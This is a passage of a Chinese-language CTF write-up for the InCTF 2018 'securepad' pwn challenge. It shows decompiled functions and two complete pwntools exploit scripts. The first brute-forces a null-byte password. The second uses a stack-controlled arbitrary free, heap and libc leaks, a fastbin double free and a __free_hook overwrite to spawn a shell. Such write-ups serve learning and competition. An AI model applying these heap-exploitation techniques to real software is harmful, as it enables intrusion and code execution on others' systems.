+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__int64 authenticate()</span><br><span class="line">&#123;</span><br><span class="line">  size_t n; &#x2F;&#x2F; ST08_8</span><br><span class="line">  unsigned int v2; &#x2F;&#x2F; [rsp+4h] [rbp-41Ch]</span><br><span class="line">  char s1; &#x2F;&#x2F; [rsp+10h] [rbp-410h]</span><br><span class="line">  unsigned __int64 v4; &#x2F;&#x2F; [rsp+418h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v4 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;Enter password&quot;);</span><br><span class="line">  get_inp(&amp;s1, 1024);</span><br><span class="line">  n &#x3D; strlen(password);</span><br><span class="line">  if ( !strncmp(&amp;s1, password, n) )</span><br><span class="line">    v2 &#x3D; system(&quot;sh&quot;);</span><br><span class="line">  else</span><br><span class="line">    v2 &#x3D; 0;</span><br><span class="line">  return v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>而password：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int init_password()</span><br><span class="line">&#123;</span><br><span class="line">  int fd; &#x2F;&#x2F; ST0C_4</span><br><span class="line">  char *v1; &#x2F;&#x2F; rax</span><br><span class="line"></span><br><span class="line">  fd &#x3D; open(&quot;&#x2F;dev&#x2F;urandom&quot;, 0);</span><br><span class="line">  read(fd, password, 0x20uLL);</span><br><span class="line">  v1 &#x3D; (char *)mmap(0LL, 0x1000uLL, 3, 34, -1, 0LL);</span><br><span class="line">  table &#x3D; (__int64)v1;</span><br><span class="line">  sizes &#x3D; (__int64)(v1 + 256);</span><br><span class="line">  return close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>利用/dev/urandom生成随机password<br><strong>不过有一定概率password初始就为”\x00”</strong><br><strong>因此我们不断在判断password时输入0字节</strong><br><strong>当遇到初始为”\x00”的情况便可以成功利用authenticate()调用system(“/bin/sh”)</strong><br><strong>EXP:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">  p&#x3D;process(&quot;.&#x2F;securepad&quot;)</span><br><span class="line">  p.recvuntil(&quot;&gt;&gt;&gt; &quot;)</span><br><span class="line">  p.sendline(&quot;1&quot;)</span><br><span class="line">  p.recvuntil(&quot;password\n&quot;)</span><br><span class="line">  p.sendline(&quot;&quot;)</span><br><span class="line">  p.sendline(&quot;ls&quot;)</span><br><span class="line">  if &quot;size&quot; not in p.recvuntil(&quot;\n&quot;):</span><br><span class="line">     p.interactive()</span><br><span class="line">     break</span><br><span class="line">  else:</span><br><span class="line">     p.close()</span><br></pre></td></tr></table></figure>
+<h4 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h4><p>delete处：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 delete()</span><br><span class="line">&#123;</span><br><span class="line">  void *ptr; &#x2F;&#x2F; [rsp+10h] [rbp-20h]</span><br><span class="line">  unsigned __int64 i; &#x2F;&#x2F; [rsp+18h] [rbp-18h]</span><br><span class="line">  __int64 v3; &#x2F;&#x2F; [rsp+20h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  puts(&quot;Enter index&quot;);</span><br><span class="line">  v3 &#x3D; (signed int)get_int(&quot;Enter index&quot;);</span><br><span class="line">  for ( i &#x3D; 0LL; i &lt;&#x3D; 9; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( i &#x3D;&#x3D; v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      ptr &#x3D; *(void **)(8 * i + table);</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    free(ptr);</span><br><span class="line">    *(_QWORD *)(8 * i + table) &#x3D; 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>可以看到，当我们index大于10时<br>ptr并不是根据索引获取<br>而是利用栈上原本此处的数据<br>而此处，位于在调用delete前的authenticate函数的<br>我们input的password区域内<br>因此我们可以传入一个大于9的index<br>并在之前布置好栈空间，使ptr处为特定地址便可以将任意地址free</strong><br>思路：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">首先正常思路,使用fastbin来leak heap address</span><br><span class="line">而后构造一个fake chunk利用delete的漏洞free进入unsorted bin</span><br><span class="line">同样的思路利用分配的unsorted bin来leak libc</span><br><span class="line">然后double free fastbin来将一个chunk分配到malloc hook或free hook前，覆盖其为system address即可</span><br></pre></td></tr></table></figure>
+<p><strong>EXP:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def authenticate(password):</span><br><span class="line">    p.recvuntil(&#39;Enter password\n&#39;)</span><br><span class="line">    p.sendline(password)</span><br><span class="line"></span><br><span class="line">def add(password, size, note):</span><br><span class="line">    p.sendlineafter(&#39;&gt;&gt;&gt; &#39;, &#39;1&#39;)</span><br><span class="line">    authenticate(password)</span><br><span class="line">    p.recvuntil(&#39;Enter size\n&#39;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.sendafter(&#39;Enter data: &#39;, note)</span><br><span class="line"></span><br><span class="line">def edit(password, index, note):</span><br><span class="line">    p.sendlineafter(&#39;&gt;&gt;&gt; &#39;, &#39;2&#39;)</span><br><span class="line">    authenticate(password)</span><br><span class="line">    p.recvuntil(&#39;Enter index\n&#39;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.send(note)</span><br><span class="line"></span><br><span class="line">def delete(password, index):</span><br><span class="line">    p.sendlineafter(&#39;&gt;&gt;&gt; &#39;, &#39;3&#39;)</span><br><span class="line">    authenticate(password)</span><br><span class="line">    p.recvuntil(&#39;Enter index\n&#39;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def view(password, index):</span><br><span class="line">    p.sendlineafter(&#39;&gt;&gt;&gt; &#39;, &#39;4&#39;)</span><br><span class="line">    authenticate(password)</span><br><span class="line">    p.recvuntil(&#39;Enter index\n&#39;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">p &#x3D; process(&#39;.&#x2F;securepad&#39;)</span><br><span class="line"></span><br><span class="line">#leak heap_addr</span><br><span class="line">#0x21 0x21</span><br><span class="line">add(&#39;kirin&#39;, 8, &#39;aaaa\n&#39;)</span><br><span class="line">add(&#39;kirin&#39;, 8, &#39;aaaa\n&#39;)</span><br><span class="line">delete(&#39;kirin&#39;, 0)</span><br><span class="line">delete(&#39;kirin&#39;, 1)</span><br><span class="line">add(&#39;kirin&#39;, 1, &#39;a&#39;)</span><br><span class="line">view(&#39;kirin&#39;, 0)</span><br><span class="line">heap_addr &#x3D; u64(p.recv(6).ljust(8,&quot;\x00&quot;))-0x61</span><br><span class="line">print &#39;heap base: &#123;&#125;&#39;.format(hex(heap_addr))</span><br><span class="line"></span><br><span class="line">#fake_chunk</span><br><span class="line">#note 1  2  3</span><br><span class="line">#0x81-&gt;0x71-&gt;0x31</span><br><span class="line">add(&#39;kirin&#39;, 0x70, p64(0) + p64(0xe1) + &#39;\n&#39;)</span><br><span class="line">add(&#39;kirin&#39;, 0x60, &#39;\n&#39;)</span><br><span class="line">add(&#39;kirin&#39;, 0x20, &#39;\n&#39;)#avoid the fusion between fake_chunk and top_chunk</span><br><span class="line"></span><br><span class="line">#leak libc</span><br><span class="line">#note 4</span><br><span class="line">#unsorted:0x70</span><br><span class="line">#unsorted bin-&gt;0x70</span><br><span class="line">delete(&#39;a&#39; * 0x3f0 + p64(heap_addr+0x60)+&#39;\n&#39;, 10)</span><br><span class="line">add(&#39;kirin&#39;, 0x70-0x10, &#39;\n&#39;)</span><br><span class="line">view(&#39;kirin&#39;,2)</span><br><span class="line">libc_addr &#x3D; u64(p.recv(6).ljust(8,&quot;\x00&quot;))-0x3c4b78</span><br><span class="line">print &#39;libc base: &#123;&#125;&#39;.format(hex(libc_addr))</span><br><span class="line">free_hook &#x3D; libc_addr + 0x3c67a8</span><br><span class="line">print &#39;free hook: &#123;&#125;&#39;.format(hex(free_hook))</span><br><span class="line">system_addr &#x3D; libc_addr + 0x45390</span><br><span class="line">print &#39;system: &#123;&#125;&#39;.format(hex(system_addr))</span><br><span class="line"></span><br><span class="line">#create 0x7f bypass the check of malloc</span><br><span class="line">#note 5</span><br><span class="line">#0x71</span><br><span class="line">edit(&#39;kirin&#39;, 2, p64(0) + p64(free_hook - 0x28) + &#39;\n&#39;)</span><br><span class="line">add(&#39;kirin&#39;, 0x60, &#39;\n&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#fastbin double free</span><br><span class="line">#4-&gt;5-&gt;4</span><br><span class="line">#0x70-&gt;0x70-&gt;0x70</span><br><span class="line">delete(&#39;kirin&#39;, 4)</span><br><span class="line">delete(&#39;kirin&#39;, 5)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">delete(&#39;a&#39; * 0x3f0 + p64(heap_addr + 0x60), 10)</span><br><span class="line"></span><br><span class="line">#chunk before free_hook</span><br><span class="line">#5-&gt;4-&gt;free_hook-0x1b</span><br><span class="line">add(&#39;kirin&#39;, 0x60, p64(free_hook-0x1b)+&#39;\n&#39;)</span><br><span class="line">#4-&gt;free_hook-0x1b</span><br><span class="line">add(&#39;kirin&#39;, 0x60, &#39;\n&#39;)</span><br><span class="line">#free_hook-0x1b</span><br><span class="line">add(&#39;kirin&#39;, 0x60, &#39;\n&#39;)</span><br><span class="line">#overwrite the free_hook by system_addr</span><br><span class="line">add(&#39;kirin&#39;, 0x60, &#39;\x00&#39;*0xb+p64(system_addr)+&#39;\n&#39;)</span><br><span class="line">edit(&#39;kirin&#39;,2,&#39;&#x2F;bin&#x2F;sh&#39;+&#39;\n&#39;)</span><br><span class="line">delete(&#39;kirin&#39;,2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-load3r"><span class="toc-number">1.</span> <span class="toc-text">0x01 load3r</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-wARMup"><span class="toc-number">2.</span> <span class="toc-text">0x02 wARMup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-securepad"><span class="toc-number">3.</span> <span class="toc-text">0x03 securepad</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#解法一"><span class="toc-number">3.1.</span> <span class="toc-text">解法一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#解法二"><span class="toc-number">3.2.</span> <span class="toc-text">解法二</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/10/19/InCTF2018-load3r-wARMup-securepad/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/10/19/InCTF2018-load3r-wARMup-securepad/&text=InCTF2018_load3r&amp;&amp;wARMup&amp;&amp;securepad" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/10/19/InCTF2018-load3r-wARMup-securepad/&title=InCTF2018_load3r&amp;&amp;wARMup&amp;&amp;securepad" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/10/19/InCTF2018-load3r-wARMup-securepad/&is_video=false&description=InCTF2018_load3r&amp;&amp;wARMup&amp;&amp;securepad" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=InCTF2018_load3r&amp;&amp;wARMup&amp;&amp;securepad&body=Check out this article: http://yoursite.com/2018/10/19/InCTF2018-load3r-wARMup-securepad/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/10/19/InCTF2018-load3r-wARMup-securepad/&title=InCTF2018_load3r&amp;&amp;wARMup&amp;&amp;securepad" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/10/19/InCTF2018-load3r-wARMup-securepad/&title=InCTF2018_load3r&amp;&amp;wARMup&amp;&amp;securepad" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/10/19/InCTF2018-load3r-wARMup-securepad/&title=InCTF2018_load3r&amp;&amp;wARMup&amp;&amp;securepad" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/10/19/InCTF2018-load3r-wARMup-securepad/&title=InCTF2018_load3r&amp;&amp;wARMup&amp;&amp;securepad" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/10/19/InCTF2018-load3r-wARMup-securepad/&name=InCTF2018_load3r&amp;&amp;wARMup&amp;&amp;securepad&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 Kirin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
